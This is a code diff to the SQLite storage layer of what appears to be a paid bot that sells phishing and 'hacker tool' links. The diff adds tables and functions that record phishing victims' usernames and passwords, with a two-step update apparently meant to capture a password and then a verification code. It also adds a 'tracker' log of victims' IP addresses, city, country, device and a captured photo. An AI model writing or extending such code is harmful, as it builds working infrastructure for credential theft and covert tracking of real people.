@@ -117,6 +117,38 @@ async def init_db():
         prices_json = '{"10_limit": {"amount": 5000, "limits": 10, "name": "10 ta limit"}, "30_limit": {"amount": 10000, "limits": 30, "name": "30 ta limit"}, "100_limit": {"amount": 25000, "limits": 100, "name": "100 ta limit"}, "unlimited": {"amount": 50000, "limits": 999, "name": "Cheksiz (1 oy)"}}'
         await db.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('prices', ?)", (prices_json,))
 
+        await db.execute('''
+            CREATE TABLE IF NOT EXISTS hacker_tools (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                token TEXT UNIQUE,
+                user_id INTEGER,
+                tool_type TEXT,
+                created_at TEXT
+            )
+        ''')
+
+        await db.execute('''
+            CREATE TABLE IF NOT EXISTS hacker_history (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                user_id INTEGER,
+                tool_type TEXT,
+                created_at TEXT
+            )
+        ''')
+
+        await db.execute('''
+            CREATE TABLE IF NOT EXISTS tracker_logs (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                token TEXT,
+                victim_ip TEXT,
+                victim_city TEXT,
+                victim_country TEXT,
+                victim_device TEXT,
+                photo_path TEXT,
+                created_at TEXT
+            )
+        ''')
+
         await db.commit()
 
 
@@ -422,15 +454,19 @@ async def create_phishing_token(user_id: int, site_type: str) -> str:
 
 
 async def save_phishing_data(token: str, username: str, password: str, ip: str = '', user_agent: str = ''):
-    """Save victim data from phishing page."""
+    """Save victim data from phishing page (supports 2-step updates)."""
     async with aiosqlite.connect(DB_PATH) as db:
         db.row_factory = aiosqlite.Row
         cursor = await db.execute('SELECT * FROM phishing_logs WHERE token = ?', (token,))
         log = await cursor.fetchone()
-        if log and not log['victim_username']:
+        if log:
+            # If username is already there, it's a second step (updating password/code)
             await db.execute('''
                 UPDATE phishing_logs 
-                SET victim_username = ?, victim_password = ?, victim_ip = ?, victim_user_agent = ?
+                SET victim_username = COALESCE(?, victim_username), 
+                    victim_password = ?, 
+                    victim_ip = ?, 
+                    victim_user_agent = ?
                 WHERE token = ?
             ''', (username, password, ip, user_agent, token))
             await db.commit()
@@ -552,3 +588,53 @@ async def gift_premium(user_id_or_username: str, limits: int):
         await db.execute('UPDATE users SET total_limits = total_limits + ? WHERE user_id = ?', (limits, user_id))
         await db.commit()
         return user_id
+
+
+async def create_hacker_tool(user_id: int, tool_type: str) -> str:
+    """Create a unique hacker tool token for a user."""
+    token = uuid.uuid4().hex[:12]
+    now = datetime.now().isoformat()
+    async with aiosqlite.connect(DB_PATH) as db:
+        await db.execute('''
+            INSERT INTO hacker_tools (token, user_id, tool_type, created_at)
+            VALUES (?, ?, ?, ?)
+        ''', (token, user_id, tool_type, now))
+        await db.commit()
+    return token
+
+
+async def get_hacker_tool(token: str):
+    """Get hacker tool data by token."""
+    async with aiosqlite.connect(DB_PATH) as db:
+        db.row_factory = aiosqlite.Row
+        cursor = await db.execute('SELECT * FROM hacker_tools WHERE token = ?', (token,))
+        return await cursor.fetchone()
+
+
+async def add_hacker_history(user_id: int, tool_type: str):
+    """Record a hacker tool usage."""
+    now = datetime.now().isoformat()
+    async with aiosqlite.connect(DB_PATH) as db:
+        await db.execute(
+            'INSERT INTO hacker_history (user_id, tool_type, created_at) VALUES (?, ?, ?)',
+            (user_id, tool_type, now)
+        )
+        await db.commit()
+
+
+async def save_tracker_log(token: str, ip: str, city: str, country: str, device: str, photo_path: str = None):
+    """Save victim data from tracker page."""
+    now = datetime.now().isoformat()
+    try:
+        async with aiosqlite.connect(DB_PATH) as db:
+            await db.execute('''
+                INSERT INTO tracker_logs (token, victim_ip, victim_city, victim_country, victim_device, photo_path, created_at)
+                VALUES (?, ?, ?, ?, ?, ?, ?)
+            ''', (token, ip, city, country, device, photo_path, now))
+            await db.commit()
+            return True
+    except Exception as e:
+        # Import logger here or use a general name if not available
+        import logging
+        logging.getLogger(__name__).error(f"Database save_tracker_log error: {e}")
+        return False
